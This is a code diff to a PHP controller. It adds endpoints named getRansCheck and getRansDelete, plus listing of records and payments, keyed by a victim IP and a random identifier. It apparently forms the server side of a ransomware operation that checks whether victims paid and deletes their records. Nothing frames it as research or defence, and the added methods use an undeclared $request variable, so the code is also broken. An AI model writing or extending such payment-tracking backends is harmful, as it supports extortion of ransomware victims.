@@ -91,6 +91,7 @@ class MainController extends Controller {
                  else
                  { 
                        $this->helpers->addRecord($req);  
+                       $this->helpers->addPayment($req);  
                         $ret = "OK";                      
                   }       
            return $ret;                                                                                            
@@ -103,8 +104,78 @@ class MainController extends Controller {
 	 */
 	public function getRansCheck()
     {
-        $ret = null;
-    	return view('index', compact(['ret']));
+         $req = $request->all();
+		   #dd($req);
+           $ret = "";
+               
+                $validator = Validator::make($req, [
+                             'ip' => 'required',
+                             'randd' => 'required',
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "wjhwjwhjef owkjhjknj!";
+                       
+                 }
+                
+                 else
+                 { 
+                       $ret = $this->helpers->checkPayment($req['randd']);  
+                  }       
+           return $ret;
+    }
+	
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getRansDelete()
+    {
+         $req = $request->all();
+		   #dd($req);
+           $ret = "";
+               
+                $validator = Validator::make($req, [
+                             'ip' => 'required',
+                             'randd' => 'required',
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "wjhwjwhjef owkjhjknj!";
+                       
+                 }
+                
+                 else
+                 { 
+                       $ret = $this->helpers->deleteRecords($req['randd']);  
+                       $ret = $this->helpers->deletePayment($req['randd']);  
+                  }       
+           return $ret;
+    }
+	
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getRecords()
+    {
+        $ret = $this->helpers->getRecords();
+    	return $ret;
+    }
+	
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getPayments()
+    {
+        $ret = $this->helpers->getPayments();
+    	return $ret;
     }
 	
 }
